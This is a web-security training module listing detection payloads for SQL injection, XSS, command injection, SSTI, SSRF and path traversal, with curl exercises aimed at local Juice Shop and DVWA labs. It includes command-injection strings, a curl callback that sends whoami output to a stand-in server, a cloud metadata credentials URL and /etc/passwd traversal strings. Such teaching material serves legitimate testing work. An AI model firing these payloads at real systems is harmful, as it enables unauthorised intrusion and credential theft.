# 01 — Fundamentals: Payloads

> These are your "first-touch" payloads — the ones you use to detect if a vulnerability exists before escalating to full exploitation. Think of them as litmus tests.

> 📋 **What You Will Do In This Section**
> - [ ] Understand detection payloads vs exploitation payloads
> - [ ] Test each payload category against Juice Shop or DVWA
> - [ ] Document which payloads trigger errors, different responses, or execution
> - [ ] Build your own "go-to" payload cheatsheet

---

## 🔴 Detection Payloads (Use These First)

> 💡 **Why This Matters**
> Detection payloads answer one question: "Is this parameter vulnerable?" They're designed to cause an observable difference (error, delay, different output) without doing damage. Always detect before exploit — it saves time and avoids noise.

### SQL Injection Detection

```sql
-- Single quote test (the universal SQLi detector)
'
-- Expected: SQL error or different response = SQLi likely

-- Boolean tests (same logic, different results = SQLi confirmed)
' OR '1'='1        -- Should return TRUE condition (more data)
' OR '1'='2        -- Should return FALSE condition (less data)
' AND '1'='1       -- Should return same as normal
' AND '1'='2       -- Should return less data or empty

-- Time-based (blind detection — if response is delayed, SQLi exists)
' OR SLEEP(5)--    -- MySQL: response takes 5 extra seconds
'; WAITFOR DELAY '0:0:5'--  -- MSSQL
' OR pg_sleep(5)--  -- PostgreSQL

-- Error-based (tries to get the database to reveal itself)
' AND 1=CONVERT(int,@@version)--  -- MSSQL: version in error
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--  -- MySQL: version in error
```

#### 🧪 Try It Now — SQLi Detection on Juice Shop

```bash
# Test 1: Single quote — does it break the query?
echo "--- Single Quote Test ---"
curl -s -o /dev/null -w "Status: %{http_code}, Size: %{size_download}" \
  "http://localhost:3000/rest/products/search?q='"
echo ""

# Test 2: Boolean TRUE — does it return more data?
echo "--- Boolean TRUE ---"
curl -s -o /dev/null -w "Status: %{http_code}, Size: %{size_download}" \
  "http://localhost:3000/rest/products/search?q=test'))OR+1=1--"
echo ""

# Test 3: Boolean FALSE — does it return less data?
echo "--- Boolean FALSE ---"
curl -s -o /dev/null -w "Status: %{http_code}, Size: %{size_download}" \
  "http://localhost:3000/rest/products/search?q=test'))AND+1=2--"
echo ""
```

> ✅ **Expected Output**
> ```
> --- Single Quote Test ---
> Status: 500, Size: 267
> --- Boolean TRUE ---
> Status: 200, Size: 26941
> --- Boolean FALSE ---
> Status: 200, Size: 12
> ```
> **Analysis:**
> - `500` on single quote → Query broke → SQLi exists
> - TRUE condition returns `26941` bytes (lots of data)
> - FALSE condition returns `12` bytes (almost nothing)
> - **Different sizes for TRUE/FALSE = Boolean SQLi confirmed**

---

### XSS Detection

```html
<!-- Basic test (does the tag render?) -->
<script>alert(1)</script>

<!-- If script tags filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Attribute context (if inside an HTML attribute) -->
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='

<!-- URL context -->
javascript:alert(1)

<!-- Detection without triggering (safe probe) -->
<b>test</b>
<!-- If "test" appears bold in the page, HTML injection works → XSS likely -->
```

> 💡 **Why This Matters**
> XSS detection payloads help you determine the injection context (HTML body? attribute? JavaScript?) before crafting a working exploit. Start with `<b>test</b>` — if it renders bold text, the app doesn't sanitize HTML output.

#### 🧪 Try It Now — XSS Detection on Juice Shop

```bash
# Test if HTML renders in the search results
curl -s "http://localhost:3000/#/search?q=<b>BOLD</b>" | grep -o "BOLD" | head -1
```

> 🔧 **If Stuck**
> XSS in Juice Shop is primarily DOM-based (happens in browser JavaScript, not server response). Test in the browser directly: navigate to `http://localhost:3000/#/search?q=<iframe src="javascript:alert(1)">` and see if an alert pops up.

---

### Command Injection Detection

```bash
# Inline execution detectors
; id
| id
|| id
& id
&& id
`id`
$(id)

# Time-based detection (if you can't see output)
; sleep 5        # If response takes 5 extra seconds → command injection!
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)

# Out-of-band (confirm with external callback)
; curl http://YOUR_SERVER/$(whoami)
; nslookup $(whoami).YOUR_DOMAIN
```

> 💡 **Why This Matters**
> Command injection gives you direct OS-level access. The `;` character terminates the current command and starts a new one. The `|` character pipes output to a new command. Try ALL separators because WAFs may block some but not others.

#### 🧪 Try It Now — Command Injection on DVWA

```bash
# DVWA Command Injection (Low difficulty) — use the browser or curl
# Login first, then:
# In the "Command Injection" module, enter:
# 127.0.0.1; id

# Expected in the page output:
# PING 127.0.0.1 ... (normal ping output)
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> ✅ **Expected Output**
> You should see normal ping output followed by the output of `id`:
> ```
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> ```
> This means the server executed YOUR command (`id`) alongside the legitimate `ping` command.

---

### SSTI (Server-Side Template Injection) Detection

```
# Universal probes — if any returns a calculated result, SSTI exists
{{7*7}}          → 49 = Jinja2/Twig
${7*7}           → 49 = Java EL / Freemarker
<%= 7*7 %>       → 49 = ERB (Ruby)
#{7*7}           → 49 = Slim/Pug

# Jinja2 confirmation
{{7*'7'}}        → 7777777 = Definitely Jinja2

# Safe detection (doesn't execute code)
{{config}}       → If it dumps the app config, SSTI confirmed
```

> 💡 **Why This Matters**
> SSTI means you can execute code on the server through a template engine. The `{{7*7}}` probe is safe — if the page shows `49` instead of the literal text `{{7*7}}`, the template engine is processing your input, and you can escalate to Remote Code Execution (RCE).

---

### SSRF Detection

```
# Cloud metadata (if running on AWS/GCP/Azure)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Localhost callback
http://127.0.0.1
http://localhost
http://[::1]

# External callback (confirms SSRF with your server)
http://YOUR_BURP_COLLABORATOR_URL
http://YOUR_INTERACTSH_URL
```

> 💡 **Why This Matters**
> SSRF is how you breach cloud infrastructure. If an application fetches URLs on your behalf, you can make it fetch internal resources (other services, cloud metadata with credentials, database admin panels) that you can't reach from the outside.

---

### Path Traversal Detection

```
# Basic traversal
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts

# Encoded traversal (bypass WAF)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd

# Double encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte (older PHP)
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

---

## 🔴 Payload Methodology — Testing Order

> 💡 **Why This Matters**
> Testing payloads in a specific order is efficient. Start with the most impactful (SQLi, command injection) and work down. This order is optimized for maximum findings in minimum time.

```
For EACH parameter you find:

1. SQL Injection     → ' (single quote) → Boolean test → Time-based
2. XSS              → <b>test</b> → <script>alert(1)</script> → Event handlers
3. Command Injection → ; id → | id → $(id)
4. SSTI              → {{7*7}} → ${7*7}
5. Path Traversal    → ../../../etc/passwd
6. SSRF              → http://169.254.169.254/ (if URL parameter)
```

#### 🧪 Try It Now — Run Through the Order on Juice Shop Search

```bash
echo "=== SQLi Test ==="
curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/rest/products/search?q='"

echo -e "\n=== XSS Test ==="
curl -s "http://localhost:3000/rest/products/search?q=<b>test</b>" | grep -c "test"

echo -e "\n=== SSTI Test ==="
curl -s "http://localhost:3000/rest/products/search?q={{7*7}}" | grep -c "49"

echo -e "\n=== Path Traversal Test ==="
curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/rest/products/search?q=../../../etc/passwd"
```

> ✅ **Expected Output**
> ```
> === SQLi Test ===
> 500                    ← SQLi exists! (500 = query broke)
> === XSS Test ===
> 1                      ← "test" found in response (may or may not be XSS — check in browser)
> === SSTI Test ===
> 0                      ← No "49" found (SSTI unlikely on this parameter)
> === Path Traversal Test ===
> 200                    ← 200 but empty results (traversal doesn't apply to search queries)
> ```
> **Result**: SQLi is the clear vulnerability here. Proceed with SQLi exploitation payloads from `03-web-exploitation/payloads.md`.

---

## 📋 Payload Quick Reference Card

```
DETECTION (does the vulnerability exist?):
  SQLi:    '
  XSS:     <b>test</b>
  CMDi:    ; id
  SSTI:    {{7*7}}
  LFI:     ../../../etc/passwd
  SSRF:    http://169.254.169.254/

CONFIRMATION (prove it works):
  SQLi:    ' OR 1=1-- -  vs  ' AND 1=2-- -  (compare response sizes)
  XSS:     <script>alert(document.domain)</script>
  CMDi:    ; sleep 5     (time-based confirmation)
  SSTI:    {{config}}    (data exfiltration)
  LFI:     ../../../etc/hostname  (read a known file)
  SSRF:    http://YOUR_SERVER/callback  (receive the callback)

EXPLOITATION (extract data, gain access):
  → See 03-web-exploitation/payloads.md
```

---

## 🧠 If You're Stuck With Payloads

1. **Payload returns normal response**: The parameter might not be vulnerable, OR it might need a different encoding. Try URL-encoding: `%27` instead of `'`, `%3Cscript%3E` instead of `<script>`.
2. **Getting blocked/filtered**: Try alternative payloads. `<script>` blocked? Use `<img onerror=alert(1) src=x>`. `;` blocked? Use `|` or `||`.
3. **Can't tell if it worked**: Compare response lengths. Send the same request with and without the payload — different lengths = the payload had an effect.
4. **Time-based payloads unreliable**: Network latency makes this tricky. Use `SLEEP(10)` instead of `SLEEP(5)` for clearer signals. Repeat 3 times to confirm.
5. **Need more payloads**: See PayloadsAllTheThings on GitHub: `https://github.com/swisskyrepo/PayloadsAllTheThings`
